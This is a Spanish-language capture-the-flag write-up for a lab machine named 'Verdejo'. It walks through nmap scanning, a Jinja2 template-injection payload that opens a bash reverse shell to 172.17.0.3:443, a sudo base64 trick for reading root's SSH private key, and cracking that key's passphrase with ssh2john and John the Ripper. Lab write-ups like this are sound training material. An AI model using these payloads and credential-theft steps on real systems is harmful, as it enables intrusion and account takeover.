# Máquina Verdejo

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.1

![alt text](image.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80,8089 -vvv -Pn 172.17.0.1

![alt text](image-1.png)

### Entrando en la web por el puerto 8089

![alt text](image-2.png)

comprobando vulnerabilidad STTI

![alt text](image-4.png)

![alt text](image-5.png)

entonces escribimos el siguiente código para reverse shell

{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c \'bash -i >& /dev/tcp/172.17.0.3/443 0>&1\'').read() }}

![alt text](image-6.png)

previamente nos ponemos en escucha en el puerto 443

### Escalar privilegios

![alt text](image-7.png)

Paso 1:
sudo base64 /root/.ssh/id_rsa | base64 --decode

![alt text](image-8.png)

![alt text](image-9.png)

Paso 2:
Si recordamos el puerto 22 estaba abierto, entonces tratamos de leer el id_rsa de root para poder loggearnos.

Paso 3:
Nos copiamos este id_rsa en nuestra máquina atacante, y con ssh2john sacamos el hash de esta clave.

ssh2john id_rsa > hash

![alt text](image-11.png)

Paso 4:
Por último con John The Ripper y el clásico rockyou crackeamos el passphrase de la clave.

john hash --wordlist=/usr/share/wordlists/rockyou.txt

![alt text](image-10.png)

Nos conectamos por ssh con el id_rsa

![alt text](image-12.png)

